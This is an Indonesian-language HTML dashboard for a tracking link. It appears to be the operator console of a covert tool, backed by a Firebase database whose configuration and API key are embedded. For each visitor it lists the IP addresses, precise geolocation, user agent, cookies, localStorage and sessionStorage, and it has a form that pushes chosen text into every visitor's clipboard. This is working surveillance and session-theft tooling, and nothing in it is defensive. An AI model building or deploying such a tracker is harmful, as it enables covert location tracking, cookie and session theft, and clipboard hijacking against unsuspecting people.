<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Dashboard Tracker</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', monospace;
      background: black;
      color: #00FF00;
    }
    h1 {
      text-align: center;
      margin-top: 20px;
    }
    #buttons {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      margin-top: 20px;
    }
    button {
      background-color: #003300;
      border: 1px solid #00FF00;
      color: #00FF00;
      padding: 8px 16px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }
    .info-card {
      border: 1px solid #00FF00;
      border-radius: 10px;
      background: rgba(0,255,0,0.05);
      padding: 10px;
      max-width: 600px;
      margin: 10px auto;
      font-size: 14px;
    }
    textarea {
      background: black;
      color: #00FF00;
      border: 1px solid #00FF00;
      font-family: 'Courier New';
      padding: 10px;
      width: 80%;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>DASHBOARD TRACKER LINK</h1>

  <div style="text-align:center; margin-top:30px;">
    <h3>Kirim Clipboard ke Semua Pengunjung</h3>
    <textarea id="clipboardInput" rows="4" placeholder="Tulis teks yang akan disalin ke clipboard pengguna..."></textarea><br>
    <button onclick="kirimClipboard()">Kirim Clipboard</button>
  </div>

  <div id="buttons"></div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function kirimClipboard() {
      const teks = document.getElementById('clipboardInput').value.trim();
      if (teks) {
        db.ref('customClipboard').set({ text: teks });
        alert("Teks clipboard telah dikirim ke pengguna.");
      }
    }

    const buttonsContainer = document.getElementById('buttons');

    db.ref('visitors').once('value', snapshot => {
      const data = snapshot.val();
      if (data) {
        let count = 1;
        for (const [key, val] of Object.entries(data)) {
          const btn = document.createElement('button');
          btn.textContent = `Informasi #${count}`;
          btn.onclick = () => toggleInfo(key, val, btn);
          buttonsContainer.appendChild(btn);
          count++;
        }
      }
    });

    function toggleInfo(key, data, btn) {
      const existing = document.getElementById('info-' + key);
      if (existing) {
        existing.remove();
      } else {
        const card = document.createElement('div');
        card.className = 'info-card';
        card.id = 'info-' + key;
        card.innerHTML = `
          <strong>ğŸ•’ Waktu:</strong> ${data.timestamp}<br>
          <strong>ğŸŒ IP Publik:</strong> ${data.ip}<br>
          <strong>ğŸ  IP Lokal:</strong> ${data.localIP || '-'}<br>
          <strong>ğŸ“ Lokasi:</strong> Lat: ${data.latitude}, Lon: ${data.longitude}, Akurasi: ${data.accuracy}<br>
          <strong>ğŸ§­ Referer:</strong> ${data.referer || '-'}<br>
          <strong>ğŸ§ª User Agent:</strong> ${data.userAgent}<br>
          <strong>ğŸª Cookies:</strong> ${data.cookies}<br>
          <strong>ğŸ“¦ LocalStorage:</strong> ${data.localStorage}<br>
          <strong>ğŸ’¾ SessionStorage:</strong> ${data.sessionStorage}
        `;
        btn.insertAdjacentElement('afterend', card);
      }
    }
  </script>
</body>
</html>
